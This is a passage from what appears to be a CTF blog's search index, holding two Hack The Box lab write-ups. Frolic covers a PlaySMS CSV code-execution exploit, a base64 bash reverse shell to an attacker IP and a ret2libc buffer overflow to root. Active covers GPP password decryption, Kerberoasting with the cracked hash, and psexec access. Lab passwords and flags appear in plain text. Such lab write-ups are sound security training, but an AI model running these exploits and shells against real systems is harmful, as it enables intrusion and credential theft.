-w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/dev/FUZZ -e .html,.txt test [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 43ms] backup [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 76ms] .html [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 45ms] [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 45ms]  Ok, let\u0026rsquo;s try both routes:\n$ curl 10.10.10.111:9999/dev/test test $ curl 10.10.10.111:9999/dev/backup/ /playsms  It shows /playsms. Actually, if we try going to http://10.10.10.111:9999/playsms, we will be redirected to a PlaySMS instance:\nHere we can log in using credentials admin:idkwhatispass:\nFoothold on the machine We can search for vulnerabilities an exploits for this technology:\n$ searchsploit playsms --------------------------------------------------------------------------------------- ----------------------- Exploit Title | Path --------------------------------------------------------------------------------------- ----------------------- PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit) | php/remote/44598.rb PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit) | php/remote/48335.rb PlaySms 0.7 - SQL Injection | linux/remote/404.pl PlaySms 0.8 - 'index.php' Cross-Site Scripting | php/webapps/26871.txt PlaySms 0.9.3 - Multiple Local/Remote File Inclusions | php/webapps/7687.txt PlaySms 0.9.5.2 - Remote File Inclusion | php/webapps/17792.txt PlaySms 0.9.9.2 - Cross-Site Request Forgery | php/webapps/30177.txt PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload | php/webapps/42003.txt PlaySMS 1.4 - 'import.php' Remote Code Execution | php/webapps/42044.txt PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit) | php/remote/44599.rb PlaySMS 1.4 - Remote Code Execution | php/webapps/42038.txt PlaySMS 1.4.3 - Template Injection / Remote Code Execution | php/webapps/48199.txt --------------------------------------------------------------------------------------- ----------------------- Shellcodes: No Results  There are several ones. Although we don\u0026rsquo;t know the exact version, we can try some of them and find out that 42044.txt works:\n$ head -47 42044.txt # Exploit Title: PlaySMS 1.4 Remote Code Execution using Phonebook import Function in import.php # Date: 21-05-2017 # Software Link: https://playsms.org/download/ # Version: 1.4 # Exploit Author: Touhid M.Shaikh # Contact: http://twitter.com/touhidshaikh22 # Website: http://touhidshaikh.com/ # Category: webapps 1. Description Code Execution using import.php We know import.php accept file and just read content not stored in server. But when we stored payload in our backdoor.csv and upload to phonebook. Its execute our payload and show on next page in field (in NAME,MOBILE,Email,Group COde,Tags) accordingly . In My case i stored my vulnerable code in my backdoor.csv files's Name field . But There is one problem in execution. Its only execute in built function and variable which is used in application. That why the server not execute our payload directly. Now i Use \"\u0026lt;?php $a=$_SERVER['HTTP_USER_AGENT']; system($a); ?\u0026gt;\" in name field and change our user agent to any command which u want to execute command. Bcz it not execute \u0026lt;?php system(\"id\")?\u0026gt; directly . Example of my backdoor.csv file content ----------------------MY FILE CONTENT------------------------------------ Name Mobile Email Group code Tags \u0026lt;?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?\u0026gt; 22 --------------------MY FILE CONTENT END HERE------------------------------- For More Details : www.touhidshaikh.com/blog/ For Video Demo : https://www.youtube.com/watch?v=KIB9sKQdEwE 2. Proof of Concept Login as regular user (created user using index.php?app=main\u0026inc=core_auth\u0026route=register): Go to : http://127.0.0.1/playsms/index.php?app=main\u0026inc=feature_phonebook\u0026route=import\u0026op=list And Upload my malicious File.(backdoor.csv) and change our User agent.  The idea is to enter PHP code inside a CSV file and upload it in \u0026ldquo;Send From File\u0026rdquo;:\nSo let\u0026rsquo;s craft the malicious CSV with a reverse shell command:\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ vim file.csv $ cat file.csv \u0026lt;?php system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'); ?\u0026gt;,2,3  When we upload it, we get a connection back:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.111. Ncat: Connection from 10.10.10.111:37598. bash: cannot set terminal process group (1237): Inappropriate ioctl for device bash: no job control in this shell www-data@frolic:~/html/playsms$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@frolic:~/html/playsms$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@frolic:~/html/playsms$ export TERM=xterm www-data@frolic:~/html/playsms$ export SHELL=bash www-data@frolic:~/html/playsms$ stty rows 50 columns 158  System enumeration If we enumerate for SUID binaries, we see a wierd one called /home/ayush/.binary/rop:\nwww-data@frolic:~/html/playsms$ cd www-data@frolic:~$ find / -perm -4000 2/dev/null /sbin/mount.cifs /bin/mount /bin/ping6 /bin/fusermount /bin/ping /bin/umount /bin/su /bin/ntfs-3g /home/ayush/.binary/rop /usr/bin/passwd /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/newuidmap /usr/bin/pkexec /usr/bin/at /usr/bin/sudo /usr/bin/newgidmap /usr/bin/chsh /usr/bin/chfn /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/lib/i386-linux-gnu/lxc/lxc-user-nic /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign www-data@frolic:~$ ls -l /home/ayush/.binary/rop -rwsr-xr-x 1 root root 7480 Sep 25 2018 /home/ayush/.binary/rop  It is a SUID binary that belongs to root. So we can execute this file as root. Let\u0026rsquo;s see what we have:\nwww-data@frolic:~$ /home/ayush/.binary/rop [*] Usage: program \u0026lt;message\u0026gt; www-data@frolic:~$ /home/ayush/.binary/rop asdf asdf  At this point we can test if it is vulnerable to Buffer Overflow entering a large amount of data:\nwww-data@frolic:~$ /home/ayush/.binary/rop $(python3 -c 'print(\"A\" * 100)') Segmentation fault (core dumped)  Nice, it\u0026rsquo;s vulnerable. Let\u0026rsquo;s transfer the binary to our attacker machine using nc to analyze it and exploit it:\nwww-data@frolic:~$ which nc /bin/nc www-data@frolic:~$ md5sum /home/ayush/.binary/rop 001d6cf82093a0d716587169e019de7d /home/ayush/.binary/rop www-data@frolic:~$ nc 10.10.17.44 4444 \u0026lt; /home/ayush/.binary/rop  $ nc -nlvp 4444 \u0026gt; rop Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.111. Ncat: Connection from 10.10.10.111:37600. $ md5sum rop 001d6cf82093a0d716587169e019de7d rop  Great. If we use Ghidra to perform a reverse engineering process, we will have this main function:\nundefined4 main(intparam_1, intparam_2) { undefined4 uVar1; setuid(0); if(param_1 \u0026lt;2) { puts(\"[*] Usage: program \u0026lt;message\u0026gt;\"); uVar1 =0xffffffff; } else{ vuln(*(undefined4 *) (param_2 +4)); uVar1 =0; } returnuVar1; }  And this function calls vuln:\nvoidvuln(char*param_1) { charlocal_34[48]; strcpy(local_34, param_1); printf(\"[+] Message sent: \"); printf(local_34); return; }  Here we have two vulnerabilities. The Buffer Overflow exists because local_34 has 48 bytes reserved as buffer, but strcpy is a vulnerable function, because it doesn\u0026rsquo;t check the available buffer and can copy data out of bounds, leading to Buffer Overflow which overwrites the return address.\nThe second vulnerability is Format String, because our input data is passed to printf as the first parameter, so we can enter formats and leak values from the stack and modify data as well. A simple proof of concept:\nwww-data@frolic:~$ /home/ayush/.binary/rop %x.%x. [+] Message sent: bfffff5f.bffffd60.  However, we will only exploit the Buffer Overflow vulnerability.\nBuffer Overflow exploitation Let\u0026rsquo;s start GDB to get the offset we need to overwrite the return address:\n$ gdb -q rop Reading symbols from rop... (No debugging symbols found in rop) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa [+] Saved as '$_gef0' gef➤ run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Starting program: /home/rocky/Desktop/HTB/Machines/Frolic/rop aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa yaaa Program received signal SIGSEGV, Segmentation fault. 0x6161616e in ?? ()  gef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 52 (little-endian search) likely [+] Found at offset 49 (big-endian search)  Alright, we need to enter 52 characters, and the following ones will overwrite values on the stack (for example, the return address, which is copied to $eip register).\nIn order to exploit the binary, we need to check its protections using checksec:\ngef➤ checksec [+] checksec for './rop' Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial  The most important one for this situation is NX, which is enabled, so the stack is not executable. Hence, we need to use a technique called Return Oriented Programming (ROP), as stated as well by the binary filename. Particularly, we will perform a Ret2Libc attack, which comes with controlling the program execution to execute system(\u0026quot;/bin/sh\u0026quot;) inside Glibc.\nLet\u0026rsquo;s see if ASLR is enabled in the machine:\nwww-data@frolic:~$ cat /proc/sys/kernel/randomize_va_space 0  It is not, which means that all addresses of shared libraries (such as Glibc) will be fixed.\nJust to have the same environment, let\u0026rsquo;s turn off ASLR and get the addresses of system and \u0026quot;/bin/sh\u0026quot;:\ngef➤ aslr off [+] Disabling ASLR gef➤ p system $2 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e08360 \u0026lt;system\u0026gt; gef➤ grep \"/bin/sh\" [+] Searching '/bin/sh' in memory [+] In '/usr/lib32/libc-2.31.so'(0xf7f38000-0xf7fac000), permission=r-- 0xf7f52363 - 0xf7f5236a → \"/bin/sh\"  Alright, so the way to perform a Ret2Libc attack in 32-bit binaries is\n\u0026lt;function-address\u0026gt; + \u0026lt;return-address\u0026gt; + \u0026lt;arg-1\u0026gt; + \u0026lt;arg-2\u0026gt; + ...  because all data passed to a function is stored on the stack. Hence, \u0026lt;function-address\u0026gt; is 0xf7e08360 (as bytes in little-endian format), \u0026lt;return-address\u0026gt; can be anything, and \u0026lt;arg-1\u0026gt; is 0xf7f52363 (as bytes), which is the address of the string \u0026quot;/bin/sh\u0026quot;.\nUsing struct.pack to parse integers as bytes, we have this payload and we exploit the binary successfully (we get a shell):\n$ ./rop $(python3 -c 'import os; from struct import pack; os.write(1, b\"A\" * 52 + pack(\"\u0026lt;I\", 0xf7e08360) + b\"A\" * 4 + pack(\"\u0026lt;I\", 0xf7f52363))') $ ls rop  Privilege escalation In order to exploit the binary in the remote machine, we need to find the exact addresses for system and \u0026quot;/bin/sh\u0026quot; in the remote Glibc library. Fortunately, we have readelf:\nwww-data@frolic:~$ which readelf /usr/bin/readelf www-data@frolic:~$ ldd /home/ayush/.binary/rop linux-gate.so.1 =\u0026gt; (0xb7fda000) libc.so.6 = /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) /lib/ld-linux.so.2 (0xb7fdb000) www-data@frolic:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 245: 00112f20 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003ada0 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 www-data@frolic:~$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh 15ba0b /bin/sh  Notice that the values above are not addresses but offsets. We need to add the offset to the base address of Glibc (which is fixed at 0xb7e19000 since there is no ASLR):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0xb7e19000 + 0x3ada0) '0xb7e53da0' \u0026gt;\u0026gt;\u0026gt; hex(0xb7e19000 + 0x15ba0b) '0xb7f74a0b'  Once we have the real addresses, we can exploit the binary using Python:\nwww-data@frolic:~$ which python3 /usr/bin/python3 www-data@frolic:~$ /home/ayush/.binary/rop $(python3 -c 'import os; from struct import pack; os.write(1, b\"A\" * 52 + pack(\"\u0026lt;I\", 0xb7e53da0) + b\"A\" * 4 + pack(\"\u0026lt;I\", 0xb7f74a0b))') # cat /home/ayush/user.txt 2ab95909cf509f85a6f476b59a0c2fe0 # cat /root/root.txt 85d3fdf03f969892538ba9a731826222  ","image":"/images/HTB/Frolic/Frolic.png","permalink":"https://7rocky.github.io/en/htb/frolic/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a website that stores some files with different encodings and esoteric languages. In the end, we reach to a PlaySMS instance that is vulnerable to RCE using PHP. The machine has a SUID binary that is vulnerable to Buffer Overflow and leads to privilege escalation","time":14,"title":"Frolic"},{"contents":"  OS: Windows   Difficulty: Easy   IP Address: 10.10.10.100   Release: 28 / 07 / 2018   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.100 -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49182 Nmap scan report for 10.10.10.100 Host is up (0.10s latency).  PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: ) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49169/tcp open msrpc Microsoft Windows RPC 49171/tcp open msrpc Microsoft Windows RPC 49182/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows  Host script results: |_clock-skew: 12m57s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: |_ start_date:  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 71.22 seconds This machine has ports 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) and 445 (SMB) open, within others.\n$ crackmapexec smb 10.10.10.100 SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) Moreover, we see that the machine is a domain controler (DC) from an Active Directory (AD) environment. We can start adding active.htb into /etc/hosts.\nSMB enumeration Using smbmap and a null session, we can enumerate SMB shares:\n$ smbmap -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; -H 10.10.10.100 [+] IP: 10.10.10.100:445 Name: 10.10.10.100  Disk Permissions Comment  ---- ----------- -------  ADMIN$ NO ACCESS Remote Admin  C$ NO ACCESS Default share  IPC$ NO ACCESS Remote IPC  NETLOGON NO ACCESS Logon server share  Replication READ ONLY  SYSVOL NO ACCESS Logon server share  Users NO ACCESS As it is shown, we have access to a share called Replication. We can download all the files using smbclient as follows:\n$ smbclient \\\\\\\\10.10.10.100\\\\Replication -N Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir  . D 0 Sat Jul 21 06:37:44 2018  .. D 0 Sat Jul 21 06:37:44 2018  active.htb D 0 Sat Jul 21 06:37:44 2018  10459647 blocks of size 4096. 5725771 blocks available smb: \\\u0026gt; cd active.htb smb: \\active.htb\\\u0026gt; recurse ON smb: \\active.htb\\\u0026gt; prompt OFF smb: \\active.htb\\\u0026gt; mget * getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\GPE.INI of size 119 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol of size 2788 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (7.7 KiloBytes/sec) (average 2.0 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.4 KiloBytes/sec) (average 1.9 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.0 KiloBytes/sec) (average 2.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 3722 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (10.4 KiloBytes/sec) (average 3.2 KiloBytes/sec) Now we have got these files from the machine:\n$ tree active.htb active.htb ├── DfsrPrivate │ ├── ConflictAndDeleted │ ├── Deleted │ └── Installing ├── Policies │ ├── {31B2F340-016D-11D2-945F-00C04FB984F9} │ │ ├── GPT.INI │ │ ├── Group Policy │ │ │ └── GPE.INI │ │ ├── MACHINE │ │ │ ├── Microsoft │ │ │ │ └── Windows NT │ │ │ │ └── SecEdit │ │ │ │ └── GptTmpl.inf │ │ │ ├── Preferences │ │ │ │ └── Groups │ │ │ │ └── Groups.xml │ │ │ └── Registry.pol │ │ └── USER │ └── {6AC1786C-016F-11D2-945F-00C04fB984F9} │ ├── GPT.INI │ ├── MACHINE │ │ └── Microsoft │ │ └── Windows NT │ │ └── SecEdit │ │ └── GptTmpl.inf │ └── USER └── scripts 21 directories, 7 files Decrypting password from Groups.xml There is a file called Groups.xml. This file is used to set group policies for the domain. The file looks like this:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;  \u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;  \u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34; /\u0026gt;  \u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; There is a user called SVC_TGS. The user\u0026rsquo;s password is encrypted in a property called cpassword. However, we are able to decrypt it because Microsoft published the cipher key for the algorithm (more information here). The decryption can be done using gpp-decrypt:\n$ gpp-decrypt \u0026#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#39; GPPstillStandingStrong2k18 Now let\u0026rsquo;s check with crackmapexec that the credentials are valid:\n$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 More SMB enumeration Now that we have valid credentials, we can check if we have more permissions in SMB:\n$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 [+] IP: 10.10.10.100:445 Name: 10.10.10.100  Disk Permissions Comment  ---- ----------- -------  ADMIN$ NO ACCESS Remote Admin  C$ NO ACCESS Default share  IPC$ NO ACCESS Remote IPC  NETLOGON READ ONLY Logon server share  Replication READ ONLY  SYSVOL READ ONLY Logon server share  Users READ ONLY We can read files from the Users share, so let\u0026rsquo;s see if we can find the user.txt flag inside:\n$ smbclient \\\\\\\\10.10.10.100\\\\Users -U SVC_TGS Enter WORKGROUP\\SVC_TGS\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir  . DR 0 Sat Jul 21 10:39:20 2018  .. DR 0 Sat Jul 21 10:39:20 2018  Administrator D 0 Mon Jul 16 06:14:21 2018  All Users DHSrn 0 Tue Jul 14 01:06:44 2009  Default DHR 0 Tue Jul 14 02:38:21 2009  Default User DHSrn 0 Tue Jul 14 01:06:44 2009  desktop.ini AHS 174 Tue Jul 14 00:57:55 2009  Public DR 0 Tue Jul 14 00:57:55 2009  SVC_TGS D 0 Sat Jul 21 11:16:32 2018  10459647 blocks of size 4096. 5725627 blocks available smb: \\\u0026gt; cd SVC_TGS smb: \\SVC_TGS\\\u0026gt; dir  . D 0 Sat Jul 21 11:16:32 2018  .. D 0 Sat Jul 21 11:16:32 2018  Contacts D 0 Sat Jul 21 11:14:11 2018  Desktop D 0 Sat Jul 21 11:14:42 2018  Downloads D 0 Sat Jul 21 11:14:23 2018  Favorites D 0 Sat Jul 21 11:14:44 2018  Links D 0 Sat Jul 21 11:14:57 2018  My Documents D 0 Sat Jul 21 11:15:03 2018  My Music D 0 Sat Jul 21 11:15:32 2018  My Pictures D 0 Sat Jul 21 11:15:43 2018  My Videos D 0 Sat Jul 21 11:15:53 2018  Saved Games D 0 Sat Jul 21 11:16:12 2018  Searches D 0 Sat Jul 21 11:16:24 2018  10459647 blocks of size 4096. 5725627 blocks available smb: \\SVC_TGS\\\u0026gt; cd Desktop smb: \\SVC_TGS\\Desktop\\\u0026gt; dir  . D 0 Sat Jul 21 11:14:42 2018  .. D 0 Sat Jul 21 11:14:42 2018  user.txt A 34 Sat Jul 21 11:06:25 2018  10459647 blocks of size 4096. 5725627 blocks available smb: \\SVC_TGS\\Desktop\\\u0026gt; get user.txt getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) And here we have it:\n$ cat user.txt 86d67d8ba232bb6a254aa4d10159e983 Kerberoasting attack Moreover, with a valid user we can perform an AS-REP Roasting attack. But indeed with valid credentials, we can perform a Kerberoasting attack.\nThis attack consists of requesting the Ticket Granting Service (TGS) for a certain user and cracking the hash offline to get the password (if it is weak).\nTo setup the attack, first we need to synchronize with the DC (using rdate or ntpdate):\n# rdate -n 10.10.10.100 And then we can check if there is any \u0026ldquo;kerberoastable\u0026rdquo; user:\n$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2021-01-21 11:07:03.723783 The user Administrator is \u0026ldquo;kerberoastable\u0026rdquo;, so let\u0026rsquo;s requests its TGS:\n$ GetUserSPNs.py -dc-ip 10.10.10.100 -request-user Administrator active.htb/SVC_TGS:GPPstillStandingStrong2k18 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2021-01-21 11:07:03.723783 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b3f17bf32ac20951eeebe31bd9eec27c$81267a58ead6dfdf2e1f618d845b12109d42d8da7e9ff346e848944a0a8c76303f16b5ebd58e757552381f48666c4f04e6907dce21cce36981fb17c49fda47e559daba2e3507b33f606e880677d447b21b45661d32d8198d333f97a8e658a5cb346a1a7425028bd1c09c9462b26f4f590a4761b7930201a4d80da3a1c88416e43c1bf5a25fbf332e6d453bbc2df4ad451f801533b1c50e9955352760e968f2b9c5c86b02e2084ef8889d579c70d801427192f07d3a21eb31831bfe512428a86acaa3437b8b2aefb38641cca421d0d5bf1079a292206035a85bbd6262ac949e2ee05c3e9dcdcd795455d3f45205fb1bf165fdb0b2b65adf02c377245959edf1aa933964a6083ba0f6b5d11baa14b7824b2934a3cdf72261f754daace37887e9fef6228cae0cef0c76c9146181669078469eb2785d27249f36c5908127ae2e05af85c83c613e176d6ffca83f2f79eec7a8ca36c1e79461bf40f3a2f925b84467240e6973887cefb29e02edd1158c632ceb7a0d3ce9e202783ceabfcbb91e734141b3f7cfff6e2d9b96f7367a1aa1c07ac138eff4618b650e707a6b00f0973faa5bf617045d14dea21ec41e2e75e772f45e3ece377288cb2f686eb1fa16128effcedf26578c4635d460b12f47798adc01a11056ae5833725b69402a1885f8748151bf865a16ccd229762b553b85fc6e549847d908e96e653f8ad7eeb9e9bbb4de30770feed0173ec8857831b452052c20411c0fde0fc1be1ad2e9577202cd729deb3a8bf226d7b17277ddcd6067f3f243ff50a3c6ec994f2e43a419f489352080d0de7b4f516a7842019f5cd2925ef32b4601baefa5526a843f6565a8f12456d66d766a70968d308cf24c31569dc2eab16a93020dcad74b9fec28f30b67f029267168fed183f33ac452fc1eca15d1e74559f412fc28d013256179b0d1aec2342f2c96f5c07ce74c1da2d7b90513e9041710ca24bac865286c092e1a9ecc70674b34868fa8e57134a8848d1aa1133e8ccd70570493bd8ef41877f5c7b9c7ca2b818ce01e30b492ac29c4b4bcf212249ec5762265f56b10b9ec8412972be10c1aa4c3ed01fffa397cd12f0d4b8ad194a9b2e6bffed8e5ce502f8cdcad4df8b6400e265b1a55573b4ae78fef5cf8e4c9e3fbd838512030f25746092e6f6a9f7f96cc4288b3260dfbd79987766106a52057e0f8326b4ddde971995a265a0f956685a0747ebf2da62af222ebdbbf792d91c363872aabea3621ea2cf7c600 Using john and rockyou.txt, we can try to crack the hash:\n$ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Ticketmaster1968 (?) 1g 0:00:00:10 DONE 0.09718g/s 1024Kp/s 1024Kc/s 1024KC/s Tiffani1432..Thrash1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed And the password is weak, so we have access as Administrator. To enter the machine, we can use psexec.py and capture the root.txt flag:\n$ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file QOyHMYhb.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service eUnT on 10.10.10.100..... [*] Starting service eUnT..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt b5fc76d1d6b91d77b2fbf2d54d0f708b ","image":"/images/HTB/Active/Active.png","permalink":"https://7rocky.github.io/en/htb/active/","section":"htb","summary":"Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform SMB enumeration, password decrypting and Kerberoasting. Basic AD enumeration and exploitation 